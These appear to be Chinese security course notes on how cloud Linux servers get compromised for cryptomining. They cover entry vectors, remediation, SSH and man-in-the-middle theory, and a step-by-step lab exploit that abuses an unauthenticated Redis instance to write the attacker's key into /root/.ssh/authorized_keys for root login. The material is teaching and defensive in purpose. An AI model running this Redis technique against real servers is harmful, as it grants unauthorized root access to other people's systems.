**简介：自己购买的Linux服务器是怎么被挖矿的**

* 背景
    * 进两年很多人购买了云服务器，阿里云、华为云、腾讯云等
    * 出现了情况是经常云服务器有不明进程，cpu使用率90%以上
    * 部署云服务器的被清空-支付比特币才可以还原
    

* N种方式
    * 弱口令爆破入侵
    * webshell文件提权入侵
    * redis端口入侵【最多】

* 最多的现象
    * 不明进程的CPU占有率过高
    * 强制停止，过一会又自动出现

    

* 解决办法
    * 关闭对外监听的端口
    * 查找linux定时任务->清除位置任务
    * redis禁止远程访问 或者 设置复杂密码、不用默认的6379端口
    * 恢复出厂设置
    * ```crontab -l```查看是否有定时任务


* 那这个入侵原理是怎样的？
    * 需要知识：
        * 对称和非对称加密知识、中间人攻击知识、ssh登录流程知识


中间人攻击:
- 非对称加密通信也存在一个致命的弱点，就是它有一个交换公钥的过程
- 琳琳 通过伪造公钥（中间人攻击），不光窃听到 老王 的消息， 还能保证整个过程中  老王 和 二当家小D 都没有察觉！
![image-20210321151933408](http://assets.processon.com/chart_image/60e51a77e0b34d548fbed5c5.png?_=1625627362968)


**简介：玩了那么多的Linux服务器-你知道SSH的原理不**

* 什么是SSH

    * Secure Shell（安全外壳协议，简称SSH）是一种加密的网络传输协议
    * 只是一种协议，存在多种实现，有商业版的也有开源实现的，OpenSSH就是开源实现
    * 它将客户端与服务端之间的消息通过加密保护起来，只讨论SSH在Linux Shell中的用法

* SSH流程解析

    * 使用了RSA非对称加密算法

  ```
  （1）远程主机收到用户的登录请求，把自己的公钥发给用户。
  （2）用户使用这个公钥，将登录密码加密后，发送回来。
  （3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录
  
  备注：如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），
  用伪造的公钥，获取用户的登录密码, 再用这个密码登录远程主机，
  那么SSH的安全机制就荡然无存了,这种风险就是著名的"中间人攻击"
  ```

* 第一次登录对方主机，系统会出现下面的提示
```
所谓“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），
很难比对，所以对其进行MD5计算，将它变成一个128位的指纹。
下例中是98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d

用户自己衡量以后决定接受这个远程主机的公钥
（远程主机贴出公钥指纹，以便用户自行核对）

接受之后，就可以输入密码，成功后就可以登录,
当远程主机的公钥被接受以后，它就会被保存在文$HOME/.ssh/known_hosts之中。
下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码```
```


入侵阿里云ECS服务器提权实战 **

* 避免违规，大家使用自购阿里云ECS
* 郑重声明⚠️：本集内容只限于小滴课堂用于教学提高业务系统安全性，切勿使用课程思路进行攻击破坏或者获取利益，如产生的一切后果与本人和所属公司无关。

```
《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚

天网恢恢，疏而不漏，一切操作都是可以被追寻到的，ip/设备/网络/基站/监控等等，总有你想不到的方式抓到你
```

* 步骤

```
1、本地ssh-keygen生成一对秘钥
ssh-keygen

2、公钥生成攻击键值, 生成后查看下 cat test.txt
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n";) > test.txt

3、配置Key到Redis中
cat test.txt |redis-cli -h 192.168.243.129 -x set bar

4、登录Redis进行检查，是否已经写入进Redis中
redis-cli -h 192.168.243.129 get bar

5、通过Redis保存机制替换系统文件
config set dir /root/.ssh
config get dir
config set dbfilename "authorized_keys"
save
exit

6、成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys

7、登录远程主机看下效果 ssh -i id_rsa root@192.168.243.129
```
 
回顾入侵流程，利用redis的持久化操作文件权限

* Redis Config Set 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启。
* Redis Save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB 文件的形式保存到硬盘。
* Redis支持RDB和AOF两种持久化机制
    * RDB持久化是把当前进程数据生成快照保存到硬盘的过程，触发RDB持久化过程分为手动触发和自动触发
    * redis持久化配置，RDB文件保存在dir配置指定的目录下，文件名通过dbfilename配置指定
    * 通过执行config set dir {newDir} 和 config set dbfilename {newFileName}运行期动态执行
    * 当下次运行时RDB文件会保存到新目录
